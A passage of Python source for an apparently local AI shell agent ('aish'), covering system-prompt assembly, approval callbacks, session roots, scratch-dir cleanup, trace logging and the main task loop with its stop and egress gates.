    """Default live-status sink: aish shows a ticking timer only when the CLI
    injects one (TTY); everywhere else these are no-ops."""

    def start(self, label: str) -> None:
        pass

    def add_tokens(self, count: int) -> None:
        pass

    def note(self, text: str) -> None:
        pass

    def stop(self) -> None:
        pass


# The live status header shows at most one line of model prose; longer text is
# capped so the header can never grow a paragraph.
STATUS_SNIPPET_CHARS = 120


def _status_snippet(text: str, limit: int = STATUS_SNIPPET_CHARS) -> str:
    """One human-readable line from model prose (preamble or thinking text):
    the first non-empty line, cut at its first sentence, capped at `limit`."""
    for line in (text or "").splitlines():
        # Strip markdown decoration from both ends — thinking summaries open
        # with bold headings ("**Defining the Cause**"), so a leading-only
        # strip left the closing asterisks in the header.
        line = line.strip().lstrip("#->• ").strip("*`_ ").strip()
        if not line:
            continue
        for end in (". ", "! ", "? "):
            cut = line.find(end)
            if cut != -1:
                line = line[: cut + 1].rstrip()
                break
        if len(line) > limit:
            line = line[: limit - 1].rstrip() + "…"
        return line
    return ""

TRIM_KEEP_CHARS = 200
TRIMMED_NOTE = "\n[trimmed: full output dropped to save context]"
# Rough tokens→chars margin: ~4 chars/token, keep well under num_ctx so the
# system prompt is never silently evicted by Ollama's own truncation.
CHARS_PER_TOKEN_BUDGET = 3
# Command output carried in an activity-trace step is a preview (the trace
# collapses it); the full result still reaches the model and streams live.
STEP_OUTPUT_CAP = 8000


def system_prompt(scratch_dir: os.PathLike | str | None = None) -> str:
    note = _PLATFORM_NOTES.get(sys.platform, f"{sys.platform} (verify userland conventions).")
    scratch_note = SCRATCH_RULE.format(scratch_dir=scratch_dir) if scratch_dir else ""
    return SYSTEM_PROMPT_TEMPLATE.format(platform_note=note, scratch_note=scratch_note)


def compose_system_content(
    base_context: str,
    cwd: str,
    lessons_path=None,
    index: str | None = None,
    scratch_dir: os.PathLike | str | None = None,
) -> str:
    """The full system message: static rules + caller context + the live
    skills/memory index. Rebuilt at every run_task so entries created
    mid-session (or after /cd) are advertised without a restart.
    Deterministic: unchanged inputs yield a byte-identical string (the scratch
    path is stable for a session's life), keeping API prompt caches valid."""
    if index is None:
        index = skills.knowledge_index(cwd, lessons_path)
    content = system_prompt(scratch_dir) + (f"\n{base_context}" if base_context else "")
    return content + (f"\n\n{index}" if index else "")


def environment_context(cwd: str) -> str:
    if sys.platform == "darwin":
        os_desc = f"macOS {platform.mac_ver()[0]}"
    else:
        os_desc = platform.platform(terse=True)
    return (
        "Environment:\n"
        f"- session started: {datetime.datetime.now().astimezone().isoformat(timespec='seconds')}"
        " (current time arrives with each task)\n"
        f"- project directory (all commands run here): {cwd}\n"
        f"- user: {getpass.getuser()}\n"
        f"- OS: {os_desc} ({platform.machine()})"
    )


def _remove_scratch(path: Path) -> None:
    """Delete the per-session scratch workspace, ignoring errors — cleanup is
    best-effort and must never raise from a finalizer/close()."""
    shutil.rmtree(path, ignore_errors=True)


def _serialize(message: dict) -> dict:
    keys = ("role", "content", "tool_name", "images", "documents")
    return {k: message[k] for k in keys if k in message}


class Agent:
    def __init__(
        self,
        model: str,
        approve: Callable[[str], Any],
        approve_write: Callable[[Any], Any] = lambda _plan: False,  # bool, Approved or Denied
        approve_read: Callable[[str, str], bool] = lambda _path, _reason: True,
        echo: Callable[[str], None] = lambda _: None,
        stream: Callable[[str], None] | None = None,
        client_chat: Callable[..., Any] = ollama.chat,
        num_ctx: int = 32768,
        max_steps: int = 25,
        think: bool = False,
        cwd: str | None = None,
        context: str = "",
        on_message: Callable[[dict], None] | None = None,
        on_token: Callable[[str], None] | None = None,
        job_log_dir: os.PathLike | str | None = None,
        lessons_path: os.PathLike | str | None = None,
        status: Any = None,
        state_dir: os.PathLike | str | None = None,
        current_session: Callable[[], Path] | None = None,
        semantic: Any = None,
        on_step: Callable[[dict], None] | None = None,
        on_command_start: Callable[[dict], None] | None = None,
        on_command_end: Callable[[dict], None] | None = None,
        step_log: Callable[[dict], None] | None = None,
        command_log: Callable[[dict], None] | None = None,
        state_log: Callable[[dict], None] | None = None,
        on_state: Callable[[dict], None] | None = None,
        check_pending_cwd: Callable[[], str | None] | None = None,
        check_pending_messages: Callable[[], list[str]] | None = None,
        aliases: Mapping[str, str] | None = None,
        approve_tool: Callable[..., Any] | None = None,
        approve_import: Callable[..., Any] | None = None,
        origin: str = "user",
    ):
        self.model = model
        # Session provenance (#160/#178): "user" for every CLI session and
        # every web chat a human started; "schedule"/"email"/"webhook" for
        # triggered sessions, set by the server's open_session. A non-user
        # origin gates outbound reads (web_search/read_url to hosts the owner
        # never mentioned — see _egress_gate), gates knowledge writes (see
        # _knowledge_gate, #196), and scopes recall to knowledge entries only.
        self.origin = origin
        # Hosts the OWNER introduced: extracted from user-typed / trigger-
        # prompt text (never from tool results or fetched pages) plus hosts
        # explicitly approved on an egress card this session. Only consulted
        # when origin != "user".
        self._owner_hosts: set[str] = set()
        self._approved_hosts: set[str] = set()
        self.provider = "ollama"  # callers overwrite after construction (cli/server)
        self.task_sources: list[dict] = []  # pages read_url fetched for the current task
        self.approve = approve
        self.approve_write = approve_write
        self.approve_read = approve_read
        self.approve_tool = approve_tool
        self.approve_import = approve_import
        self.echo = echo
        self.stream = stream
        self.chat = client_chat
        # aish-owned command aliases, expanded on the first word BEFORE the
        # approval gate (see aliases.py and expand_alias). Sanitized so a
        # malformed config entry can never make a command un-runnable.
        self.aliases: dict[str, str] = alias_map.sanitize(aliases or {})
        self.num_ctx = num_ctx
        self.max_steps = max_steps
        self.think = think
        self.cwd = cwd or os.getcwd()
        # Session roots: auto-approved reads/commands are confined to these
        # trees. Seeded with the launch dir; they only widen on an explicit
        # user decision — /cd, /add-dir, or "trust this directory" answered on
        # an approval prompt. Execution is stateless for the model: cwd moves
        # only on user action (/cd, !cd) — a model-issued bare cd never runs.
        self.roots: list[Path] = [Path(self.cwd).resolve()]
        # Command prefixes the user allowed for THIS session only ('s' at the
        # prompt / "Allow this session" on the card), unioned with the
        # persistent allowlist but never written to disk. It lives here beside
        # roots because both scope auto-approval and both are session property,
        # so restore_workspace resets them together (#176) — the approvers read
        # it live rather than owning a set whose lifetime is the process.
        self.session_prefixes: set[str] = set()
        # The dir this agent was launched in, kept for restore_workspace: a
        # session that never recorded a cwd re-anchors HERE, never to wherever
        # the chat being left happened to be sitting (#176).
        self.launch_cwd = self.cwd
        self.on_message = on_message
        self.on_token = on_token
        self.job_log_dir = job_log_dir
        self.lessons_path = lessons_path
        # Session store for the search_sessions tool; current_session is
        # excluded from ranking (its content is already this conversation).
        self.state_dir = state_dir
        self.current_session = current_session
        # Embedding-based preflight selection (issue #43); opt-in from the
        # entry points so tests and bare Agents stay network-free.
        self.semantic = semantic
        self._semantic_warned = False
        self.status = status if status is not None else _NoStatus()
        # Structured activity-trace steps for a rich client (the web UI). When
        # wired, tool/thinking/knowledge progress flows through here as typed
        # events; the terminal keeps its flat echo lines (see _note). Extra
        # run_command detail (command, decision, output) is stashed here by the
        # dispatch branch and read back when the completion step is emitted.
        self.on_step = on_step
        # Terminal-block framing for a rich client (the web UI): command_start
        # carries cwd + the (possibly edited) command, command_end the exit
        # code (or a detached/interrupted label). Both are recorded so a
        # session replay reconstructs the bounded block identically. Unused by
        # the terminal, which streams output inline.
        self.on_command_start = on_command_start
        self.on_command_end = on_command_end
        # Persistence sink for the same trace steps, orthogonal to rendering:
        # both entry points wire this to the session log so the activity trace
        # survives eviction/restart and is reconstructable in any UI. The CLI
        # sets step_log WITHOUT on_step, so its terminal chatter (see _note)
        # stays while its steps are still logged for later web replay/analysis.
        self.step_log = step_log
        # Persistence sink for the terminal-block framing events, so a
        # cold-loaded session reconstructs the SAME command_start/command_end
        # event stream a live one emits — byte-identical panel, not a fallback.
        # The command's output is not duplicated here; it rides on the `tool`
        # trace step, and reconstruct_events splices it back in as one stream.
        self.command_log = command_log
        # Workspace-change sinks (issue #94), parallel to step_log/on_step:
        # state_log persists a cwd move / dir trust as a `kind:"cwd"` /
        # `kind:"trust_dir"` record so resume/cold-open can restore the
        # workspace; on_state surfaces the same change live in the web timeline.
        # reconstruct_events replays those records into the identical event.
        self.state_log = state_log
        self.on_state = on_state
        # Between-steps steering hooks (issue #95), polled at the top of every
        # run_task loop iteration so a long task stays responsive without being
        # aborted: check_pending_cwd applies a /cd the UI queued while busy
        # (moves cwd + rebuilds the system prompt for the new dir);
        # check_pending_messages injects text the user typed mid-task so the
        # next model turn pivots. Both are thread-safe get/drain callbacks (the
        # server sets from the event loop, the worker thread consumes here).
        self.check_pending_cwd = check_pending_cwd
        self.check_pending_messages = check_pending_messages
        self._run_meta: dict | None = None
        self._cancel = threading.Event()
        # Turn/call identity (docs/trace-contract.md §2), advanced by
        # _reset_task_state. `turn` starts at 0 so the first task is turn 1.
        self._turn = 0
        self._call_seq = itertools.count(1)
        # The call id currently being dispatched, so a `gate` verdict joins to
        # the `tool` step for the action it governed (§2). Thread-local rather
        # than a plain attribute: _call_result runs on the main thread for the
        # sequential path and on the SDK's worker threads under claude-max, and
        # a shared attribute would be one refactor away from joining a verdict
        # to the wrong call — the same reasoning that keeps `call` a local in
        # _call_result on the parallel read-only path.
        self._call_ids = threading.local()
        # Rule bindings in force for this turn (#191) — the runtime objects the
        # gate queries. Empty for a turn no rule matched, which is the common
        # case and costs one set-membership test per dispatch.
        self._bindings: list[rules.Binding] = []
        self._binding_seq = itertools.count(1)
        # Plugin tools (TOOL.md), rebuilt only when the tool dirs' signature
        # moves — a mid-task manifest edit is picked up on the next step.
        # Read-only tools are always exposed; mutating ones only when a tool
        # approver is wired (fail-closed otherwise — never run ungated).
        self._plugin_sig: tuple | None = None
        self._plugin_tools: dict[str, tool_plugins.Tool] = {}
        self._plugin_defs: list[dict] = []
        self._plugin_warned: set[str] = set()
        # (command-prefix, tool-name) for exposed tools that declare
        # `prefer_over:` — lets the agent nudge the model toward a tool when it
        # runs a raw command the tool should be used instead of (issue #140).
        self._tool_prefer: list[tuple[str, str]] = []
        # Skill-read gate state: oversized preloaded skills the model must
        # read_skill (or explicitly waive) before other tools run; values are
        # refusals left before the gate auto-lifts. Rebuilt every run_task.
        self._pending_skill_reads: dict[str, int] = {}
        # Stop gate (issue #81): armed when a DENIAL carries a concern, cleared
        # by the main loop only on a text-only turn (deny means stop). While
        # armed, _stop_gate refuses every tool call.
        self._pending_comment_response = False
        self.base_context = context
        # Per-session scratch workspace (issue #70): a private temp dir where
        # the model may create AND delete throwaway files without prompting.
        # Resolved so it matches operand realpaths on macOS (/var → /private).
        # A weakref.finalize cleans it up when the Agent is dropped or at
        # interpreter exit; server sessions also close() it on eviction.
        self.scratch_dir = Path(tempfile.mkdtemp(prefix="aish-scratch-")).resolve()
        self._scratch_finalizer = weakref.finalize(
            self, _remove_scratch, self.scratch_dir
        )
        # The media store (#188): where show_image puts pictures an answer
        # displays. Deliberately NOT the scratch dir — scratch is deleted when
        # the session ends and a transcript is permanent, so an image left there
        # is a broken picture on every reopen. Shared across sessions (it is
        # content-addressed and self-pruning); falls back to scratch only when
        # there is no state dir at all, where nothing is durable anyway.
        self.media_dir = (
            Path(state_dir) / "media" if state_dir is not None else self.scratch_dir / "media"
        )
        # Full, untruncated plugin-tool outputs, content-addressed (#192). Same
        # reasoning as the media store for the location: a continuation must
        # outlive the scratch dir, because a result truncated in one turn is
        # paged in a later one. Self-pruning LRU.
        self.tool_output_dir = (
            Path(state_dir) / "tool-output"
            if state_dir is not None
            else self.scratch_dir / "tool-output"
        )
        content = compose_system_content(
            context, self.cwd, self.lessons_path, scratch_dir=self.scratch_dir
        )
        self.messages: list[dict] = [{"role": "system", "content": content}]

    def close(self) -> None:
        """Best-effort scratch-workspace cleanup. Idempotent; also runs
        automatically when the Agent is garbage-collected or the interpreter
        exits (weakref.finalize)."""
        self._scratch_finalizer()

    def cancel(self) -> None:
        """Stop the running task at the next boundary: mid-stream (the token
        loop), before the next model call, before executing proposed tool
        calls, or by terminating the running shell command. Thread-safe —
        called from the server loop while run_task holds a worker thread."""
        self._cancel.set()

    def reset(self) -> None:
        """Drop the conversation, keep the system prompt."""
        del self.messages[1:]

    def load_history(self, messages: list[dict]) -> None:
        """Adopt messages from a previous session (already logged — appended
        directly so they are not re-recorded)."""
        self.messages.extend(m for m in messages if m.get("role") != "system")
        # Restore egress provenance (#178): user-role turns are owner-authored
        # by construction (typed messages, the trigger prompt, aish's own
        # notes) — tool results stay excluded, so a cold reopen neither widens
        # nor narrows what the live session had granted from owner text.
        for message in messages:
            if message.get("role") == "user" and isinstance(message.get("content"), str):
                self.note_owner_hosts(message["content"])

    def rewind_last_task(self) -> str | None:
        """Undo the most recent user turn: drop that user message and everything
        the assistant produced after it (text, tool_calls, tool results), plus
        the TASK_REMINDER that preceded it. Web retry (#60) calls this so a rerun
        regenerates from a clean context — the model never sees its discarded
        answer (run_task re-adds the prompt and reminder fresh). Returns the
        removed user text, or None when there is no user turn to undo."""
        for i in range(len(self.messages) - 1, 0, -1):
            if self.messages[i].get("role") == "user":
                text = self.messages[i].get("content")
                cut = i
                prev = self.messages[cut - 1]
                if prev.get("role") == "system" and str(
                    prev.get("content", "")
                ).startswith(TASK_REMINDER_MARK):
                    cut -= 1
                del self.messages[cut:]
                return text if isinstance(text, str) else None
        return None

    def redact_turn(self, text: str, occurrence: int = 1) -> bool:
        """Drop a removed turn from the model's context (#202): the user message
        itself, its TASK_REMINDER, and everything the assistant produced from it,
        up to the next user turn. Without this the log would be scrubbed while
        the running conversation kept the text — and kept quoting it.

        The turn is named by TEXT plus which identical-text turn it is, because
        ids live on the log records and these dicts are what goes to the
        backends. Not found is a no-op: the log-side removal has already
        happened and is the durable half.
        """
        seen = 0
        for i in range(1, len(self.messages)):  # messages[0] is the system prompt
            if self.messages[i].get("role") != "user":
                continue
            if self.messages[i].get("content") != text:
                continue
            seen += 1
            if seen < occurrence:
                continue
            cut = i
            prev = self.messages[cut - 1]
            if prev.get("role") == "system" and str(
                prev.get("content", "")
            ).startswith(TASK_REMINDER_MARK):
                cut -= 1
            end = next(
                (
                    j
                    for j in range(i + 1, len(self.messages))
                    if self.messages[j].get("role") == "user"
                ),
                len(self.messages),
            )
            del self.messages[cut:end]
            return True
        return False

    def _append(self, message: dict) -> None:
        self.messages.append(message)
        if self.on_message:
            self.on_message(_serialize(message))

    def _note(self, text: str) -> None:
        """Terminal progress chatter (✓ ran X, → read Y, ✓ thought for …).
        A rich client gets the same information as structured `on_step` events
        and renders its own activity trace, so this is suppressed there to
        avoid showing every line twice."""
        if self.on_step is None:
            self.echo(text)

    def _sink_step(self, step: dict) -> None:
        """Single delivery point for every structured trace step: persist it
        (so any UI can reconstruct the trace later) and hand it to the rich
        renderer if one is attached. Kept separate from on_step so the two
        concerns — durable logging vs live rendering — stay independent."""
        if step.get("kind") in TURN_STAMPED_STEPS:
            self._turn_stamp(step)
        if self.step_log is not None:
            self.step_log(step)
        if self.on_step is not None:
            self.on_step(step)

    def _emit_command_start(self, command: str, user: bool = False) -> None:
        # `user` marks a command the user typed directly (! prefix): the web UI
        # renders it as a standalone terminal block in the transcript, not
        # nested in the model's activity trace.
        event: dict = {"cwd": self.cwd, "command": command}
        if user:
            event["user"] = True
        if self.command_log is not None:
            self.command_log({"kind": "cmd_start", **event})
        if self.on_command_start is not None:
            self.on_command_start(event)

    def _emit_command_end(self, **payload: Any) -> None:
        if self.command_log is not None:
            self.command_log({"kind": "cmd_end", **payload})
        if self.on_command_end is not None:
            self.on_command_end(payload)

    def _emit_step(self, **step: Any) -> None:
        self._sink_step(step)

    def _emit_record(self, **fields: Any) -> None:
        """Durable governance evidence (docs/trace-contract.md §1.2).

        LOG-ONLY: never handed to `on_step`, so it reaches no renderer and
        cannot open a live trace card. That is not stylistic — `app.js`'s
        `traceStep` calls `ensureTrace()` BEFORE dispatching on `step.kind`, so
        a kind with no renderer opens an EMPTY live card with a running ticker
        rather than doing nothing.

        This is one of the two required halves; `session.RENDERLESS_STEPS` (the
        replay skip) is the other, and either alone still produces the card.
        Every kind emitted here must be in that set — asserted by test.
        """
        self._turn_stamp(fields)
        if self.step_log is not None:
            self.step_log(fields)

    def _turn_stamp(self, step: dict) -> dict:
        """Stamp turn identity on a record (§2, design fork 1 = option b: new
        kinds plus tool_start/tool/knowledge; `thinking` is left alone)."""
        step.setdefault("turn", self._turn)
        return step

    def _emit_workspace(self, change: str, path: str) -> None:
        """Persist a user-driven workspace change (cwd move / dir trust) and
        surface it live in the timeline — parallel to _sink_step: durable log
        vs live render. The persisted record and the live event carry the same
        data reconstruct_events replays, so cold and hot timelines match."""
        record_kind = "cwd" if change == "cwd" else "trust_dir"
        field = "cwd" if change == "cwd" else "path"
        if self.state_log is not None:
            self.state_log({"kind": record_kind, field: path})
        if self.on_state is not None:
            self.on_state({"change": change, "path": path})

    def _sync_cwd_in_context(self) -> None:
        """Keep the system prompt's 'project directory' line current after a cwd
        move, so the model reads its cwd from the (per-task / mid-task rebuilt)
        system prompt — no disruptive conversation turn needed. Only that line
        changes; the fixed session-start timestamp stays put, so an unchanged cwd
        still yields a byte-identical prompt (prompt-cache friendly)."""
        if not self.base_context:
            return
        self.base_context = re.sub(
            r"(- project directory \(all commands run here\): ).*",
            lambda m: m.group(1) + self.cwd,
            self.base_context,
            count=1,
        )

    def restore_workspace(self, cwd: str | None, trusted: list[str]) -> None:
        """Reapply a session's persisted cwd + trusted dirs on resume/cold-open.

        AUTHORITATIVE, not additive (#176): the roots become EXACTLY this
        session's own workspace — its recorded cwd plus the dirs it recorded
        trusting. Both failure directions are bugs, and roots is what scopes
        approval.py's auto-approval, so neither may be tolerated: nothing rides
        along from the chat being left (the CLI reuses ONE live Agent across
        /resume, so an appended /add-dir used to widen the gate in a chat that
        never granted it), and nothing this chat trusted is dropped.

        The other half of that gate's session scope — session_prefixes, the
        prefixes allowed with 's' — is dropped here for the same reason. It is
        never restored: prefixes are not recorded on disk, so the honest
        behaviour is that landing in a chat re-grants nothing and the user is
        asked again, rather than inventing persistence the log cannot back.

        State is set DIRECTLY (never through rebase/trust_root) so restoring
        emits no fresh cwd/trust record — that would be a replay feedback loop.
        Missing paths degrade gracefully: a session that recorded no cwd, or
        whose cwd is gone, re-anchors to the LAUNCH workspace — the same base
        the web gives a cold-opened session — and a vanished trusted dir is
        skipped. Roots a process (not a session) owns — the web's uploads dir —
        are re-added by their owner after this call."""
        anchor = cwd if cwd and os.path.isdir(cwd) else self.launch_cwd
        self.cwd = anchor
        # Rebuilt in place: closures hand out this exact list (the approvers'
        # get_scope, the web's root union), so it must stay the same object.
        self.roots[:] = [Path(anchor).resolve()]
        self.session_prefixes.clear()  # same object rule as roots above
        self._sync_cwd_in_context()  # restored cwd shows in the system prompt too
        for path in trusted:
            resolved = Path(path).resolve()
            if resolved.is_dir() and not any(
                resolved.is_relative_to(root) for root in self.roots
            ):
                self.roots.append(resolved)

    def _apply_pending_cwd(self) -> None:
        """Apply a /cd the UI queued while this task runs (issue #95), between
        steps instead of only after the whole task. rebase() moves cwd,
        re-anchors roots[0], logs the #94 cwd record and fires on_state (the web
        server turns that single signal into the top-bar chip + queue-card
        update — one path for mid-task, immediate, and post-task moves alike).
        Then the system prompt is rebuilt for the new directory — same helper
        run_task uses at entry — so the new dir's environment context and
        preloaded skills apply to every following step. Not a tool call, so it
        never touches the #81 gates or the loop-detection counters."""
        if self.check_pending_cwd is None:
            return
        target = self.check_pending_cwd()
        if not target:
            return
        # announce=False: mid-task, do NOT inject a user-turn note — the model
        # would treat it as a new prompt and abandon the running task. The cwd
        # still moves (commands run in the new dir) and the skills index below is
        # rebuilt for it; the model just isn't disruptively interrupted (#95).
        result = self.rebase(target, announce=False)
        if result.startswith("ERROR"):
            return  # a vanished/invalid dir: rebase already reported it
        self.messages[0]["content"] = compose_system_content(
            self.base_context, self.cwd, self.lessons_path, scratch_dir=self.scratch_dir
        )

    def _inject_pending_messages(self) -> None:
        """Fold in text the user typed while this task runs (issue #95): instead
        of deferring it to a separate follow-up task, each queued message is
        injected as a user turn mid-task so the very NEXT model call pivots —
        steering, not a reset. Surfaced as a distinct `injected` trace step,
        which renders live AND is replayed identically by reconstruct_events
        (kept inside the open turn, so cold and hot timelines match). The text is
        appended straight to self.messages — NOT via _append — so it logs no
        conversation `message` record, which reconstruct would otherwise replay
        as a turn-splitting second user bubble. Trade-off: the steering text is
        therefore not carried into --resume history (it shaped the answer, which
        is). Not a tool call — leaves the gates and loop counters untouched."""
        if self.check_pending_messages is None:
            return
        for msg in self.check_pending_messages():
            if not msg:
                continue
            # No echo line — the `injected` step ("You added" note) is the sole,
            # clean timeline marker for this (#95); a grey echo would duplicate it.
            self._emit_step(kind="injected", text=msg)
            self.note_owner_hosts(msg)  # steering is owner-typed (#178)
            self.messages.append({"role": "user", "content": msg})

    def _reset_task_state(self) -> None:
        """Return every per-task field to a fresh task's starting point.

        Called from the top of run_task AND by ClaudeMaxAgent before each SDK
        task — the SDK owns that loop, so run_task never runs there, and any
        per-task state reset only inside run_task would leak across claude-max
        tasks forever (issue #178 P0-4: one denial-with-comment armed the stop
        gate for the rest of the session). Add new per-task fields HERE, not
        inline in run_task, so the two entry points can never drift. The loop
        detector's `repeats` dict needs no entry: it is a run_task local,
        per-task by construction.
        """
        self.task_sources = []
        self._run_meta = None  # stale run_command detail must not tag a new task's first step
        self._cancel.clear()  # a stale stop must not kill the new task
        # Turn/call identity (docs/trace-contract.md §2). `turn` is the join key
        # for "what governed this turn"; it lives here rather than in run_task
        # precisely so claude-max — whose loop never enters run_task — counts
        # turns too. `call` restarts per turn and is assigned at dispatch, so a
        # gate verdict and the tool step it governed are joinable without the
        # positional guessing curate._windows apologises for.
        self._turn += 1
        self._call_seq = itertools.count(1)
        # Bindings are TURN-scoped by definition — a rule binds a turn, not a
        # session — so they are dropped here rather than in run_task, which
        # claude-max never enters. Both entry points re-seed immediately after.
        self._bindings = []
        self._binding_seq = itertools.count(1)
        # Skill-read gates belong to the task that armed them; run_task re-arms
        # from its own preflight right after this reset.
        self._pending_skill_reads = {}
        # A new task starts un-gated: any pending comment belonged to the last
        # task and would otherwise stall the first tool call of this one.
        self._pending_comment_response = False

    def run_task(
        self,
        task: str,
        images: list[str] | None = None,
        documents: list[str] | None = None,
        *,
        keep_history: bool = False,
    ) -> str:
        # Fresh scan every task: skills/memory created mid-session (or after
        # /cd) show up immediately, in every open session — no restart needed.
        index = skills.knowledge_index(self.cwd, self.lessons_path)
        self.messages[0]["content"] = compose_system_content(
            self.base_context, self.cwd, self.lessons_path, index, scratch_dir=self.scratch_dir
        )
        self.messages[1:] = [
            m
            for m in self.messages[1:]
            if not (
                m.get("role") == "system"
                and str(m.get("content", "")).startswith(TASK_REMINDER_MARK)
            )
        ]

        # Per-task state (including the turn counter) is reset HERE, before
        # anything this task does can emit a record. The eager trim below is
        # why the position matters: it runs as preparation for THIS task, so a
        # `trim` record stamped with the previous turn would tell #197 that the
        # turn which lost its evidence was the one that finished, not the one
        # about to run. Resetting first makes "every record emitted during a
        # task carries that task's turn" true by construction rather than by
        # each emit site being in the right half of the function.
        # Safe to hoist: nothing between here and the old call site reads the
        # fields it clears, and `_pending_skill_reads` is re-armed from this
        # task's own preflight immediately below.
        self._reset_task_state()

        # Old tasks' raw tool outputs are rarely needed verbatim again;
        # shrinking them keeps long REPL sessions inside the context window.
        task_start = len(self.messages)
        if keep_history:
            # Resuming an interrupted task (#164): what looks like "an old task"
            # here IS this task's own unfinished work, so trimming it to a
            # 200-char stub would throw away exactly the results the resumed run
            # must not recompute. Keep them whole and fall back to the same
            # oldest-first trim only if the context genuinely doesn't fit.
            self._trim_history_to_budget()
        else:
            self._trim_eagerly(task_start)

        # Task text is owner-authored (a typed message or the trigger prompt),
        # so its hosts enter egress provenance (#178 P0-2).
        self.note_owner_hosts(task)

        # Media rides on the user message as file paths; each backend encodes
        # them for its API (ollama `images`, data URLs, Anthropic blocks).
        user_message: dict = {"role": "user", "content": task}
        if images:
            user_message["images"] = list(images)
        if documents:
            user_message["documents"] = list(documents)
# Pre-flight retrieval (issue #40): inject matching knowledge bodies
        # directly instead of hoping the model calls recall/read_skill. The
        # /8 keeps the injection a small slice of the context-char budget.
        # A short follow-up carries the conversation's topic, not its own
        # (#183), so recent user turns ride along as embedding-query context;
        # aish's own synthetic notes ("[aish: …]", "[I moved the session…]")
        # are skipped — they describe plumbing, not topic.
        prior_user_text = " ".join(
            content
            for message in self.messages
            if message.get("role") == "user"
            and isinstance(content := message.get("content"), str)
            and content.strip()
            and not content.lstrip().startswith("[")
        )
        preload = skills.preflight(
            self.cwd,
            self.lessons_path,
            task,
            char_budget=min(
                skills.PREFLIGHT_TOTAL_CHARS,
                self.num_ctx * CHARS_PER_TOKEN_BUDGET // 8,
            ),
            semantic=self.semantic.scores if self.semantic is not None else None,
            context=prior_user_text[-skills.PREFLIGHT_CONTEXT_CHARS :],
        )
        if self.semantic is not None and self.semantic.error and not self._semantic_warned:
            self._semantic_warned = True
            self.echo(
                "⚑ semantic recall unavailable "
                f"({self.semantic.error[:80]}); falling back to word matching"
            )
        self._pending_skill_reads = {n: GATE_MAX_REFUSALS for n in preload.unread}
        # Seed (#191): evaluate the rule corpus against this turn and create the
        # bindings, at the same position `knowledge` is emitted from — before
        # the user message, so nothing this turn dispatches can outrun the gate.
        rules_text = self.seed_rules(task)
        self.messages.append(
            {"role": "system", "content": task_reminder(index, preload.text, rules_text)}
        )
        if rules_text:
            self.mark_rules_seeded()  # the prose reached context — record it
        if preload.names:
            self._note("⚑ preloaded knowledge: " + ", ".join(preload.names))
            # sim/rail/score diagnostics persist to the session log via the
            # trace sink, so retrieval precision stays auditable from logs
            # alone (#183); the frontend chips read only label/kind.
            self._emit_step(
                kind="knowledge",
                mode=preload.mode,
                items=[{"label": it.pop("name"), **it} for it in preload.items],
            )
        self._append(user_message)

        task_started = time.perf_counter()
        tokens_in = tokens_out = 0
        repeats: dict[tuple, int] = {}  # (tool, args, result) -> occurrences
        # Progress-gated budget (#108): `max_steps` is the base, the ceiling is
        # the hard cost cap nothing exceeds, and `stall` counts consecutive
        # no-new-progress steps. A progressing task extends past max_steps; a
        # stalled one stops at MAX_STALL_STEPS.
        ceiling = max(self.max_steps, HARD_STEP_CEILING)
        stall = 0
        step = 0
        while step < ceiling:
            step += 1
            if self._cancel.is_set():
                return self._finish_cancelled()
            # Absorb anything the user queued while this task runs (issue #95),
            # BEFORE the model call so the next turn already reflects it. Neither
            # is a tool call, so both are placed outside the dispatch path and
            # leave the #81 gates and the loop-detection counters untouched.
            self._apply_pending_cwd()
            self._inject_pending_messages()
            self._enforce_budget(task_start)
            turn_start = time.perf_counter()
            # A live "Thinking…" row on the trace timeline; it finalizes to
            # "Thought for Xs" when the turn produced tools, or is dropped when
            # the turn was a plain answer (thinking_cancel below).
            self._emit_step(kind="thinking_start")
            self.status.start("thinking")
            try:
                content, tool_calls, usage, raw_blocks, thinking_text = self._chat_turn()
            except TaskCancelled:
                return self._finish_cancelled()
            finally:
                self.status.stop()
            turn_secs = time.perf_counter() - turn_start
            tokens_in += usage[0]
            tokens_out += usage[1]
            entry: dict = {"role": "assistant", "content": content}
            if tool_calls:
                entry["tool_calls"] = tool_calls
            if raw_blocks:
                # Provider-native content blocks (e.g. Anthropic thinking +
                # tool_use): the backend echoes these verbatim on the next
                # request instead of reconstructing the turn.
                entry["raw_blocks"] = raw_blocks
            self._append(entry)
            # A `disclose` obligation lifts on the model's own words, and those
            # words must land BEFORE this turn's tool calls are dispatched —
            # the whole point is that the substitution is announced, not
            # explained afterwards. Only `content` counts: it is what the user
            # sees, unlike the thinking channel (#191).
            if content:
                self.note_model_text(content)

            # Deny means STOP: only a TEXT-ONLY turn clears the stop gate.
            # Clearing on any content would be defeated by chatty preamble (or
            # thinking surfaced as content) that models emit alongside a tool
            # call — another command would run in the same turn. So the gate
            # holds until the model stops and replies with no tool call; that
            # turn also ends the task (normal loop semantics), so the user
            # steers before anything else runs.
            if content and not tool_calls:
                self._pending_comment_response = False

            if not tool_calls:
                result = content or EMPTY_RESPONSE
                if not content and self.on_token:
                    self.on_token(result + "\n")
                self._note(f"✓ answered in {format_secs(turn_secs)}{_tokens_note(usage)}")
                total = time.perf_counter() - task_started
                self._note(
                    f"∑ total {format_secs(total)}{_tokens_note((tokens_in, tokens_out))}"
                )
                # a plain answer needs no "Thinking" row, but carry the turn time
                # and token usage so the web trace can label the answer step
                # ("Answered in Xs") and keep the "↑N ↓M tokens" header (#84) —
                # a text-only turn has no later "thinking" step to carry it.
                self._emit_step(kind="thinking_cancel", secs=turn_secs, tokens=list(usage))
                return result

            # Ollama buffers tool-call generation and streams nothing until it
            # is done, so live counts are impossible here — report per turn.
            self._note(f"✓ thought for {format_secs(turn_secs)}{_tokens_note(usage)}")
            # The model's own words ride the thinking step so the trace header
            # can say WHY the coming tools run: `say` = preamble emitted
            # alongside the tool calls, `gist` = first line of its reasoning.
            # Keys are omitted when empty — old logs replay byte-identically.
            thinking_step: dict = {"kind": "thinking", "secs": turn_secs, "tokens": list(usage)}
            if say := _status_snippet(content):
                thinking_step["say"] = say
            if gist := _status_snippet(thinking_text):
                thinking_step["gist"] = gist
            self._emit_step(**thinking_step)
            if content and self.on_token is None:
                self.echo(content)

            if self._cancel.is_set():
                # Proposed calls must not run after a stop — but every
                # tool_use still needs a paired result or the next request
                # is rejected (Anthropic pairing rules).
                for call in tool_calls:
                    self._append(
                        {
                            "role": "tool",
                            "tool_name": call["function"]["name"],
                            "content": NOT_EXECUTED,
                        }
                    )
                return self._finish_cancelled()

            results = self._execute_tool_calls(tool_calls)
            warn = stuck = progressed = False
            for call, result in zip(tool_calls, results, strict=True):
                self._append(
                    {"role": "tool", "tool_name": call["function"]["name"], "content": result}
                )
                self._collect_source(call, result)
